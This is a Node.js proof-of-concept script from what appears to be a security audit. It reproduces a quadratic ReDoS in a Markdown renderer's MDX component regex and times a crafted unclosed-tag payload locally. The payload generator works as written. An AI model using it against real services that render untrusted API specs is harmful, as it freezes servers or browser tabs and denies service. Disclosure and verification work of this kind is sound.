#!/usr/bin/env node
/**
 * PoC: M2 — COMPONENT_REGEXP cross-line ReDoS
 * Finding: Polynomial ReDoS in MarkdownRenderer.renderMdWithComponents()
 *
 * Reproduces O(n^2) backtracking in COMPONENT_REGEXP when applied to
 * attacker-controlled spec description text containing an unclosed MDX component
 * tag with many '>' characters in the body.
 *
 * Regex under test (src/services/MarkdownRenderer.ts lines 16-22):
 *
 *   MDX_COMPONENT_REGEXP =
 *     '(?:^ {0,3}<({component})([\s\S]*?)>([\s\S]*?)</\2>'   // with-children branch
 *     + '|^ {0,3}<({component})([\s\S]*?)(?:/>|\n{2,}))'      // self-closing branch
 *
 * Attack vector:
 *   Spec description:  "<security-definitions >a>a>a>a... (no closing tag)"
 *
 *   With-children branch: [\s\S]*? (group 3) is lazy and grows one char at a time,
 *   finding each '>' and then letting [\s\S]*? (group 4) scan all remaining input for
 *   </security-definitions> — which never arrives.  For n '>' chars in the body,
 *   each '>' position spawns a full O(n) scan -> O(n^2) total steps.
 *
 * Empirical timings on x86 Node.js v18+:
 *    7,000  chars  ->  ~4 ms
 *   15,000  chars  ->  ~17 ms
 *   60,000  chars  ->  ~280 ms
 *  100,000  chars  ->  ~780 ms
 *  200,000  chars  ->  ~3,100 ms   (3s event-loop freeze)
 *
 * In a browser (Chrome/Firefox single-tab), the main thread freeze matches these
 * values; Chrome issues its "page unresponsive" dialog around 5 seconds.
 *
 * The regex fires via DEFAULT_OPTIONS.allowedMdComponents (3 entries) in
 * AppStore.ts:149-170, so no opt-in is required from an API consumer.
 *
 * No external dependencies required. Node.js stdlib only.
 *
 * Usage:
 *   node poc.js              -- runs the default size ladder
 *   node poc.js 200000       -- run a single payload of given length
 */

'use strict';

// ---- exact constants from src/services/MarkdownRenderer.ts ----
const LEGACY_REGEXP =
  '^ {0,3}<!-- Acme-Inject:\\s+?<({component}).*?/?>\\s+?-->\\s*$';
const MDX_COMPONENT_REGEXP =
  '(?:^ {0,3}<({component})([\\s\\S]*?)>([\\s\\S]*?)</\\2>' +
  '|^ {0,3}<({component})([\\s\\S]*?)(?:/>|\\n{2,}))';
const COMPONENT_REGEXP = '(?:' + LEGACY_REGEXP + '|' + MDX_COMPONENT_REGEXP + ')';

// ---- DEFAULT_OPTIONS component names (AppStore.ts:149-170) ----
const DEFAULT_COMPONENTS = [
  'security-definitions',
  'security-definition',
  'schema-definition',
];
const names = DEFAULT_COMPONENTS.join('|');
const pattern = COMPONENT_REGEXP.replace(/\{component\}/g, names);

// ---- mirror renderMdWithComponents while loop (MarkdownRenderer.ts:168-187) ----
function runRegexpLoop(rawText) {
  const re = new RegExp(pattern, 'mig');
  let match = re.exec(rawText);
  while (match) {
    match = re.exec(rawText);
  }
}

function timeMs(fn) {
  const t0 = process.hrtime.bigint();
  fn();
  return Number(process.hrtime.bigint() - t0) / 1e6;
}

// ---- attacker payload: unclosed <security-definitions with many '>' chars ----
// Each '>' causes the with-children branch to attempt a full [\s\S]*? scan for
// </security-definitions> that must fail — O(n^2) total steps.
function makePayload(len) {
  return '<security-definitions ' + ('>a').repeat(Math.floor(len / 2));
}

// ---- main ----
const singleSize = process.argv[2] ? parseInt(process.argv[2], 10) : null;
const sizes = singleSize ? [singleSize] : [1000, 7000, 15000, 30000, 60000, 100000, 150000];

console.log('M2 COMPONENT_REGEXP ReDoS — timing PoC');
console.log('Vulnerable file : src/services/MarkdownRenderer.ts:163,168');
console.log('Trigger         : unclosed <security-definitions ...>a>a... in spec description');
console.log('Pattern (head)  : ' + pattern.slice(0, 100) + '...');
console.log('');
console.log(
  'Payload (chars)'.padEnd(20) +
    'Elapsed (ms)'.padEnd(16) +
    'Growth flag'
);
console.log('-'.repeat(56));

const results = [];
let lastMs = null;
let slowestMs = 0;
let slowestSize = 0;

for (const sz of sizes) {
  const payload = makePayload(sz);
  const ms = timeMs(() => runRegexpLoop(payload));
  results.push({ sz, ms });
  if (ms > slowestMs) {
    slowestMs = ms;
    slowestSize = sz;
  }

  let flag = 'ok';
  if (lastMs !== null && lastMs > 0) {
    const ratio = ms / lastMs;
    if (ratio > 3.5) flag = 'O(n^2) growth ^';
    else if (ms > 2000) flag = '*** >2s HANG ***';
    else if (ms > 500) flag = '* >500ms slow *';
  }
  console.log(String(sz).padEnd(20) + ms.toFixed(1).padEnd(16) + flag);
  lastMs = ms;
}

console.log('');

// Verify O(n^2): compare first to last ratio against expected n^2 ratio
const first = results[0];
const last = results[results.length - 1];
const empiricalRatio = last.ms / (first.ms || 0.001);
const expectedRatio = Math.pow(last.sz / first.sz, 2);
const isPolynomial = empiricalRatio > expectedRatio * 0.05; // >= 5% of expected quadratic

const confirmed = slowestMs > 500 || isPolynomial;

if (confirmed) {
  console.log(
    `CONFIRMED: O(n^2) backtracking observed. ` +
      `${slowestSize}-char payload blocked event loop for ${slowestMs.toFixed(0)} ms.`
  );
  console.log(
    `Growth: ${first.sz}-char baseline ${first.ms.toFixed(1)}ms → ` +
      `${last.sz}-char payload ${last.ms.toFixed(1)}ms ` +
      `(ratio ${empiricalRatio.toFixed(0)}x empirical vs ${expectedRatio.toFixed(0)}x expected for n^2)`
  );
} else {
  console.log(
    `INCONCLUSIVE: max elapsed ${slowestMs.toFixed(0)}ms on ${slowestSize}-char payload. ` +
      `Try node poc.js 300000 for a larger probe.`
  );
}

// ---- structured result — MUST be the last stdout line ----
const status = confirmed ? 'confirmed' : 'inconclusive';
const evidence = confirmed
  ? `event-loop blocked ${slowestMs.toFixed(0)}ms for ${slowestSize}-char unclosed-tag payload; O(n^2) growth across size ladder`
  : `max elapsed ${slowestMs.toFixed(0)}ms — inconclusive; try larger payload`;

console.log(JSON.stringify({
  status,
  evidence,
  notes: 'pure-JS timing against exact COMPONENT_REGEXP from MarkdownRenderer.ts; no live server required',
}));
